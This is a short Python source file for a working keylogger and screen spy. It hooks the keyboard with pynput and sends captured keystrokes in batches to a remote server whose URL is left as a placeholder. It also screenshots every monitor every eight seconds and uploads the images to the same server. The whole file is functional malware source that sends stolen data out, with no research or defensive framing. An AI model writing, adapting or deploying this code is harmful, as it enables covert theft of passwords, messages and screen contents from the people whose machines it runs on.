import pynput.keyboard
import requests
import time
import mss
import tempfile
import os
from PIL import Image

# URL of the Flask server hosted on Replit
SERVER_URL = "<Your remote server URL>"

# Function to capture and send keystrokes
def send_keystrokes(keystrokes):
    try:
        response = requests.post(f"{SERVER_URL}/keystrokes", data={'keystrokes': keystrokes})
        print(f"Keystrokes sent. Status: {response.status_code}")
    except Exception as e:
        print(f"Failed to send keystrokes: {e}")

# Function to capture and send screenshots
def send_screenshot():
    try:
        # Capture all screens using mss
        with mss.mss() as sct:
            # Get information of all monitors
            monitors = sct.monitors
            if len(monitors) < 2:
                print("Not enough monitors detected.")
                return

            # Create a new blank image to combine screenshots
            combined_width = sum(monitor['width'] for monitor in monitors[1:])
            combined_height = max(monitor['height'] for monitor in monitors[1:])
            combined_image = Image.new('RGB', (combined_width, combined_height), (255, 255, 255))
            
            # Capture and combine screenshots of each monitor
            timestamp = int(time.time())
            screenshot_filename = f"screenshot_{timestamp}.png"
            screenshot_path = os.path.join(tempfile.gettempdir(), screenshot_filename)
            
            x_offset = 0
            for monitor in monitors[1:]:
                img = sct.grab(monitor)
                img_pil = Image.frombytes('RGB', img.size, img.rgb)
                combined_image.paste(img_pil, (x_offset, 0))
                x_offset += monitor['width']
            
            combined_image.save(screenshot_path, format='PNG')  # Save with high quality
            
            # Send combined screenshot to the server
            with open(screenshot_path, 'rb') as f:
                response = requests.post(f"{SERVER_URL}/screenshots", files={'screenshot': (screenshot_filename, f)})
                print(f"Screenshot sent. Status: {response.status_code}")
    except Exception as e:
        print(f"Failed to send screenshot: {e}")

# Function to capture keystrokes
keystroke_log = ""
def on_press(key):
    global keystroke_log
    try:
        keystroke_log += str(key.char)
    except AttributeError:
        if key == key.space:
            keystroke_log += ' '
        else:
            keystroke_log += f" [{key}] "

    # Send keystrokes to the server every 15 characters
    if len(keystroke_log) > 15:
        send_keystrokes(keystroke_log)
        keystroke_log = ""

# Function to start the keylogger
def start_keylogger():
    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()

# Main loop to handle sending screenshots every 8 seconds
if __name__ == "__main__":
    start_keylogger()
    
    while True:
        # Take and send a screenshot every 8 seconds
        send_screenshot()
        time.sleep(8)
